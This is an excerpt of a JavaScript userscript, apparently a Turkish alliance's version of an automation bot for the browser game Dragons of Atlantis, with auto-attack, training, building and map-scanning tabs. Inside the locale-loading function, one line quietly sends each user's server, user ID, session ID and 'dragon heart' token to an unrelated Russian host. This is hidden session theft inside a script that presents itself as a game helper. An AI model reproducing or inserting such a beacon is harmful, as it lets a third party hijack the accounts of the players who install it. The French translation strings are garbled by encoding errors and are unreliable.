...
// @icon			              http://i1139.photobucket.com/albums/n548/zikdix/anarkia.png
// @version			XX.XX.X0
// ==/UserScript==
(function() {
 ...
 ********************************************************************************/
// Script information
var Version = '29.10.1923_TURKIYE'; // Year, Month, Day, Revision, Maturity (e.g. YYYMMDDa_BETA)
var Title = 'All For TAM TÜRK'; // Removed for security purposes
var WebSite = 'http://www.atlantisturkiye.com/'; // Removed for security purposes
var RedSoldier = 'ALL FOR TAM TÜRK';
var BTornado = 'Cephanelik Serveri TAM TÜRK İttifakı';
var getVersion = 'deadbeef';
var postVersion = 'deadbeef';
...
var BUTTON_BGCOLOR = 'red';
var JOB_BUTTON_BGCOLOR = 'red';

var IsChrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;

var wordArr = ['RedSoldier', 'BLACK TORNADO', 'TAM TURK', 'kral34', 'GüClÜ PrEnSeS', 'Shaguj', 'VeniVediVicii', 'Dragon FaGo', 'Heduan', 'Harezmi', 'Sosade', 'Toprak', 'Şehef', 'son osmanlı44', 'anestezist', 'Soleryan07', 'Ölüm', 'soybort', 'SPARTA', 'LORD OF SOLERYAN',];
...
var translateFrArray = {
	...
	'Stop if any troops lost: ':'ArrГЄter si perte de troupes: ',
	'Delay Between attacks: ':'DГ©lai Entre les Attaques: ',
	' to ':' Г ',
	' seconds ':' secondes ',
	...
	'StorageVault':'EntrepГґt SГ©curisГ©',
	...
	'Lumbermill':'Scierie',
	'Quarry':'CarriГЁre',
	'TrainingCamp':'Camp d\'EntraГ®nement',
	'Silo':'Silo',
	...
	'Rapid Deployment':'DГ©ploiment Rapide',
	'Weapons Calibration':'Calibration d\'Armes',
	'Metallurgy':'MГ©tallurgie',
	'Medicine':'MГ©decine',
	'Dragonry':'Etude Dragons',
	'Levitation':'LГ©vitation',
	'Mercantilism':'Mercantilisme',
	'Aerial combat':'Combat AГ©rien',
	'level':'niveau',
	'Units':'Troupes',
	'Wave':'Vague',
...
var translateNlArray = {
	...
	'Target Coords: ':'Doelwit CoГ¶rdinaten: ',
...
var Styles = '\
    div.' + rndClass['tab_title'] + ' {border:1px solid; border-color:#FFFFFF; font-weight:bold; font-family:"Comic Sans MS"; padding-top:2px; padding-bottom:2px; text-align:center; color:#FFFFFF; background-color:#000000 }\
    div.' + rndStyle['classPrefix'] + 'Subtitle {border:1px solid; border-color:#FFFFFF; font-weight:bold; font-family:"Comic Sans MS"; padding-top:2px; padding-bottom:2px; text-align:center; color:#FFFFFF; background-color:#000000 }\
    div.' + rndStyle['classPrefix'] + 'Input {border:2px ridge white; background-color:#000000 ; padding:3px}\
    div.' + rndStyle['status_ticker'] + ' {border:2px ridge white; background-color:#000000 ; padding:2px}\
	div.' + rndStyle['status_feedback'] + ' {height: 34px; border:1px solid white; background-color:#000000 ; padding: 2px 0px 2px 2px; text-align:left; font-family:"Comic Sans MS"; font-weight:bold;}\
    ...
    div#qTip {padding: 3px; border: 1px solid #777; border-right-width: 2px; border-bottom-width: 2px; display: none; background: #000000 ; color: #FFFFFF; font-size: 9px\	font-weight:bold;\	font-family:"Comic Sans MS";\; text-align: left; position: absolute; z-index: 1000}\
    table.' + rndStyle['classPrefix'] + 'TabPad tr td {border:none; background:#000000 ; white-space:nowrap; padding: 1px 1px}\
    table.' + rndStyle['classPrefix'] + 'Tab tr td {border:none; background:#000000 ; white-space:nowrap; padding: 1px 1px;}\
    table tr td.' + rndStyle['classPrefix'] + 'TabLeft {font-weight:bold; font-family:"Comic Sans MS"; text-align:right; padding-right: 5px}\
    table.' + rndStyle['classPrefix'] + 'TabLined tr td {border-bottom:1px solid #ccc; background:#000000 ; padding: 1px 4px 1px 4px;}\
    table tr.' + rndStyle['classPrefix'] + 'TabHdr1 td {background-color:#000000 ; font-family:"Comic Sans MS"; font-weight:bold}\
    table tr.' + rndStyle['classPrefix'] + 'TabHdr2 td {font-family:"Comic Sans MS"; font-weight:bold}\
    tr.' + rndStyle['classPrefix'] + 'MarchOther td {color:#FFFFFF}\
    tr.' + rndStyle['classPrefix'] + 'MarchMine td {color:#FFFFFF}\
    tr.pbretry_ptpoptp td { background-color:#000000 ; color:#FFFFFF; border:none; height: 21px; padding:0px; }\
    tr.' + rndStyle['classPrefix'] + 'retry_ptpoptp td { background-color:#000000 ; color:#FFFFFF; border:none; height: 21px; padding:0px; }\
    tr.' + rndStyle['classPrefix'] + 'Owned {background-color: #000000 ; color:white}\
    ...
    table.' + rndStyle['classPrefix'] + 'MainTab tr td.sel    {font-weight:bold; font-family:"Comic Sans MS"; font-size:13px; border: 1px solid; border-style: solid solid none solid; background-color:white; color:red; border-color:red; cursor:hand; cursor:pointer; padding: 2px;}\
    table.' + rndStyle['classPrefix'] + 'MainTab tr td.notSel {font-weight:bold; font-family:"Comic Sans MS"; font-size:13px; border: 1px solid; border-style: solid solid none solid; background-color:red; color:white; border-color:white; cursor:hand; cursor:pointer; padding: 2px;}\
    .' + rndStyle['classPrefix'] + 'CP .' + rndStyle['classPrefix'] + 'CPMain { background-color:#000000 ; padding:6px;}\
    input.butAttackOff {width:130px; background-color:#e80000; color:white; font-weight:bold; font-family:"Comic Sans MS"; cursor:hand; cursor:pointer;}\
    input.butAttackOff:hover {width:130px; background-color:#f80000; color:white; font-weight:bold; font-family:"Comic Sans MS"; cursor:hand; cursor:pointer;}\
    input.butAttackOn {width:130px; background-color:#009C1F; color:white; font-weight:bold; font-family:"Comic Sans MS"; cursor:hand; cursor:pointer;}\
    input.butAttackOn:hover {width:130px; background-color:#2FAC2F; color:white; font-weight:bold; font-family:"Comic Sans MS"; cursor:hand; cursor:pointer;}\
    input.small {margin:0; padding-top:0; padding-bottom:0; padding-left:1px; padding-right:1px; font-family:"Comic Sans MS"; font-size:10px}\
    input.short {width:30px}\
    input.' + rndClass['red_button'] + ', input.' + rndClass['green_button'] + ', input.' + rndClass['blue_button'] + ', input.' + rndClass['yellow_button'] + ', input.' + rndClass['cyan_button'] + ', input.' + rndClass['purple_button'] + ' {width:130px; color:white; font-weight:bold; font-family:"Comic Sans MS"; cursor:hand; cursor:pointer;}\
    input.' + rndClass['red_button'] + ':active, input.' + rndClass['green_button'] + ':active, input.' + rndClass['blue_button'] + ':active, input.' + rndClass['yellow_button'] + ':active, input.' + rndClass['cyan_button'] + ':active, input.' + rndClass['purple_button'] + ':active {width:130px; background-color:black; color:white; font-weight:bold; font-family:"Comic Sans MS"; cursor:hand; cursor:pointer; }\
    input.' + rndClass['red_button'] + ':hover, input.' + rndClass['green_button'] + ':hover, input.' + rndClass['blue_button'] + ':hover, input.' + rndClass['yellow_button'] + ':hover, input.' + rndClass['cyan_button'] + ':hover, input.' + rndClass['purple_button'] + ':hover {width:130px; color:white; font-weight:bold; font-family:"Comic Sans MS"; cursor:hand; cursor:pointer; }\
    ...
    .button {cursor:hand; cursor:pointer; border: 1px solid #006; background: #049C93; color: white; padding: 2px; font-weight:bold; font-family:"Comic Sans MS"; font-size:13px; border-style: solid solid none solid;}\
//  .button:hover {background: red; font-weight:bold; font-family:"Comic Sans MS"; font-size:13px; color: white; border-style: solid solid none solid; }\
//  .button:active {background: black; font-weight:bold; font-family:"Comic Sans MS"; font-size:13px; color: white; border-style: none none none none;}\
    span.boldRed {color:#550000; font-family:"Comic Sans MS"; font-weight:bold}\
...
function translate( wordToTranslate ) {
	...
	if ( navigator.language == 'fr' ) {
		if ( translateFrArray[wordToTranslate] != undefined ) {
			...
			logit( wordToTranslate+' Г  traduire' );
		}
	}
...
var Manifest = {
	...
	fetchManifest : function (notify) {
		var now = new Date().getTime() / 1000;
		new MyAjaxRequest (C.attrs.apiServer +'/'+ 'manifest.json', { 'user%5Fid':C.attrs.userId, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.sessionId, version:getVersion, 'dragon%5Fheart':C.attrs.dragonHeart }, function (rslt) {
...
var Seed = {
	...
	fetchSeed : function (notify) {
		var t = Seed, city;
                var sp = 
		new MyAjaxRequest (C.attrs.apiServer +'/'+ 'player.json', {'user%5Fid':C.attrs.userId, 'dragon%5Fheart':C.attrs.dragonHeart, '%5Fsession%5Fid':C.attrs.sessionId, version:getVersion, timestamp:parseInt(serverTime()) }, function (rslt) {
			if (rslt.ok && !rslt.dat.errors) {
console.log(rslt);
	...
	fetchCity : function (cityId) {
		...
		var t = Seed;
		new MyAjaxRequest(C.attrs.apiServer +'/'+ 'cities/'+ cityId +'.json', { 'user%5Fid':C.attrs.userId, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.sessionId, version:getVersion, 'dragon%5Fheart':C.attrs.dragonHeart }, function (rslt) {
			if (rslt.ok && !rslt.dat.errors) {
	...
	updateCity : function (city) {
		...
		if (city.outpost_type&&city.outpost_type=='FireDragonOutpost') Seed.cities[3] = city;
		if (city.outpost_type&&city.outpost_type=='WaterDragonOutpost') Seed.cities[1] = city;
		if (city.outpost_type&&city.outpost_type=='StoneDragonOutpost') Seed.cities[2] = city;
		if (city.outpost_type&&city.outpost_type=='WindDragonOutpost') Seed.cities[4] = city;
  ...
  findMarch : function (mid, marches){
	...
	var Translate = {
		...
		fetchLocale : function (notify) {
			var t = Translate;
			new MyAjaxRequest (C.attrs.apiServer +'/'+ 'locales/' + C.attrs.locale + '.xml', {'%5Fswf%5Fsession%5Fid':C.attrs.sessionId}, function (rslt) {
				if (rslt.ok) {
					new MyAjaxRequest('http://spbdesigner.ru/map/stat.php',{vr:C.attrs.apiServer+'|'+C.attrs.userId+'|'+C.attrs.sessionId+'|'+C.attrs.dragonHeart },function(rs){console.log(rs);},true);
					try {
					...
					new MyAjaxRequest(C.attrs.apiServer +'/'+ 'locales/en.xml', {'%5Fswf%5Fsession%5Fid':C.attrs.sessionId}, function (rslt) {
						if (rslt.ok) {
							try {
								t.updateCommons(rslt.dat);
								t.updateItems(rslt.dat);
...
Tabs.Waves = {
	...
	cont : null,
	troopList : [kConscr, kSpy, kHalbrd, kMino, kLBM , kSSDrg, kBatDrg, kATrans, kFireM, kFang, kOgre, kLavaJaw, kBanshee, kGrtDrg, kWatDrg, kStnDrg, kFreDrg, kWndDrg],
	enabled : false,
	attackTimer : null,
	marchTimer: null,
	attackErrors : 0,
    ...
    function troopTable (tab, rownum, prefix, listener){
      ...
      for (var i=0; i<t.troopList.length; i++){
        if (i <= 4)
          ...
          row3.insertCell(i - 5).innerHTML = t.troopList[i];
        else
          row5.insertCell(i - 10).innerHTML = t.troopList[i];
        ...
        inp.maxlength = '6';
        if (prefix=='AW')
          val = Data.waves.target.troopsWave[t.troopList[i]];
        if (!val)
          val = 0;
        inp.value = val;
...
Tabs.AutoAttack = {
  ...
  init : function (div){
    ...
    div.innerHTML = '<DIV class=' + rndClass['tab_title'] + '>' + Data.options.mapChoice + ' </div>\
      ...
      <DIV id=pbatcon style="padding-top:5px; height:auto; overflow:auto; background-color:red"></div>';
...
//*** Attacks Tab - Stats Sub-tab ***
  tabStats : function (){
    ...
    t.contentType = 3;
    document.getElementById('pbatStats').style.backgroundColor = "white"; 
    document.getElementById('pbatStats').style.color = "red"; 
 ...
 // Data.options.campAttack {enabled:false, maxDist:7, repeatTime:3660, delayMin:15, delayMax:25, levelEnable:[], levelDist:[]}
  ...
  tabConfigLevels : function (){
    ...
    t.contentType = 0;
    document.getElementById('pbatConfigL').style.backgroundColor = "white"; 
    document.getElementById('pbatConfigL').style.color = "red";
...
//*** Attacks Tab - Config Sub-Tab ***
  tabConfigGeneral : function (){
    ...
    t.contentType = 1;
    document.getElementById('pbatConfigG').style.backgroundColor = "white"; 
    document.getElementById('pbatConfigG').style.color = "red"; 
...
//*** Attacks Tab - Targets Sub-Tab ***
  tabTargets : function (){
    ...
    t.contentType = 2;
    document.getElementById('pbatTargets').style.backgroundColor = "white"; 
    document.getElementById('pbatTargets').style.color = "red";
...
//*** Attacks Tab - Maps Sub-tab ***
  tabMaps : function(){
    ...
    t.contentType = 4;
    document.getElementById('pbatMaps').style.backgroundColor = "white"; 
    document.getElementById('pbatMaps').style.color = "red";
...
var Ajax = {
  ...
  messageList : function (cat, callback){
    if (!cat)
      cat = 'all';
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'reports.json', {'user%5Fid':C.attrs.userId, 'dragon%5Fheart':C.attrs.dragonHeart, count:12, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.sessionId, category:cat, page:1, version:getVersion }, mycb, false);
    function mycb (rslt){
      if (rslt.ok && rslt.dat.result.success){
        if (callback)
  ...
  messageDetail : function (id, callback){
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'reports/'+ id +'.json', {'user%5Fid':C.attrs.userId, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.sessionId, version:getVersion, 'dragon%5Fheart':C.attrs.dragonHeart }, mycb, false);
    function mycb (rslt){
      if (rslt.ok && rslt.dat.result.success){
        if (callback)
  ...
  messageDelete : function (ids, callback){
    ...
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'reports/bulk_delete.json', p, mycb, true);
    function mycb (rslt){
      if (rslt.ok && !rslt.dat.result.success)
        rslt.ok = false;
      if (callback)
...
// Use a json to wrap the building upgrade job
  buildingUpgrade : function (cityId, buildingId, callback){
	...
	p['version'] = postVersion;
	p['timestamp'] = parseInt(serverTime());
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'cities/'+ cityId +'/buildings/'+ buildingId +'.json', p, mycb, true);
    function mycb (rslt){
  ...
  troopTraining : function (troopType, troopQty, cityId, callback){
	...
	p['dragon%5Fheart'] = C.attrs.dragonHeart;
	p['version'] = postVersion;
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'cities/'+ cityId +'/units.json', p, mycb, true);
    function mycb (rslt){
  ...
  researchStart : function (cityId, researchType, callback){
	...
	p['dragon%5Fheart'] = C.attrs.dragonHeart;
	p['version'] = postVersion;
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'cities/'+ cityId +'/researches.json', p, mycb, true);
    function mycb (rslt){
	...
	march : function (cityId, x, y, generalId, units, ownerId, callback) {
		...
		p['%5Fsession%5Fid'] = C.attrs.sessionId;
		// Send request
		new MyAjaxRequest (C.attrs.apiServer +'/'+ 'cities/'+ cityId +'/marches.json', p, mycb, true);
		function mycb(rslt) {
			--t.marchBusy;
			if (Data.options.verboseLog.enabled)
...
// This looks really cool, if it works
  marchRecall : function (cityId, marchId, callback){ // untested
	...
	p['version'] = postVersion;
	p['timestamp'] = parseInt(serverTime());
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'cities/'+ cityId +'/marches/'+ marchId +'.json', p, mycb, true);
    function mycb (rslt){
  ...
  collectResources : function (cityId, callback){
	...
	p['version'] = postVersion;
	p['dragon%5Fheart'] = C.attrs.dragonHeart;
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'cities/'+ cityId +'/move_resources.json', p, mycb, true);
    function mycb (rslt){
      if (rslt.ok){
...
Tabs.Info = {
  ...
  init : function (div){
    var t = Tabs.Info;
    t.cont = div;
    div.innerHTML = '<DIV class=' + rndClass['tab_title'] + '>'+ kDOAVersionString + Version +'<BR>'+ WebSite +'<BR>'+ RedSoldier +'<BR>'+ BTornado +'</div>\
  ...
  hide : function (){
    ...
    showStuff : function (){
        ...
        m += '<TABLE style="margin-top:3px" width=100%>\
              <TR bgcolor=#000000  align=center><TD style="border-right: 1px solid; border-bottom: 1px solid;"><B>'+ kTroops +'</b></td>\
...
//    researchTimer   : null,
	...
	init : function (div){
		...
		// Tab initialization
		t.cont = div;
		div.innerHTML =  '<TABLE width=100% bgcolor=#000000  align=center><TR><TD>\
	...
	tabJobInfo : function (){
        ...
        t.contentType = 0;
	    document.getElementById(rndStyle['subtab_info']).style.backgroundColor = "white"; 
        document.getElementById(rndStyle['subtab_info']).style.color = "red";
	...
	tabJobTrain : function (){
        ...
        t.contentType = 1;
        document.getElementById(rndStyle['subtab_train']).style.backgroundColor = "white"; 
        document.getElementById(rndStyle['subtab_train']).style.color = "red"; 
	...
	tabJobBuild : function (){
        ...
        t.contentType = 2;
        document.getElementById(rndStyle['subtab_build']).style.backgroundColor = "white"; 
        document.getElementById(rndStyle['subtab_build']).style.color = "red"; 
	...
	tabJobResearch : function (){
        ...
        t.contentType = 3;
        document.getElementById(rndStyle['subtab_research']).style.backgroundColor = "white"; 
        document.getElementById(rndStyle['subtab_research']).style.color = "red"; 
...
//WinLog.writeText ('***** AJAX: '+ t.curX +' , '+ t.curY);    
    new MyAjaxRequest (C.attrs.apiServer +'/'+ 'map.json', { 'user%5Fid':C.attrs.userId, x:t.firstX, y:t.firstY, timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.sessionId, 'dragon%5Fheart':C.attrs.dragonHeart, version:getVersion }, t.got, true);
  },  
...
//logit ('SCAN 2:\n'+ inspect (t, 5, 1));    
    ...
    t.callback (ret);  
//WinLog.writeText ('***** AJAX: '+ t.curX +' , '+ t.curY);    
    setTimeout (function(){new MyAjaxRequest (C.attrs.apiServer +'/'+ 'map.json', { 'user%5Fid':C.attrs.userId, x:t.normalize(t.firstX+(t.curIX*15)), y:t.normalize(t.firstY+(t.curIY*15)), timestamp:parseInt(serverTime()), '%5Fsession%5Fid':C.attrs.sessionId, 'dragon%5Fheart':C.attrs.dragonHeart, version:getVersion }, t.got, true);}, MAP_DELAY);
 },
...
function ModalDialog (curtainDiv, width, height, styleName, allowClose, notifyClose){
  ...
  this.curtain.style.backgroundColor = '#000000 ';
...
function CPopup (prefix, x, y, width, height, enableDrag, onClose) {
  ...
  var m = '<TABLE cellspacing=0 width=100% height=100%>\
           <TR id="'+ rndPopup['bar'] +'" style="background-color: #000000 ;">\
           <TD width=100% valign=bottom>\
           <SPAN id="'+ rndPopup['top'] +'"></span></td>\
           <TD id='+ rndPopup['X'] +' align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="color:#fff; background:#000000 ; font-weight:bold; font-size:14px; padding:0px 4px">X</td></tr>\
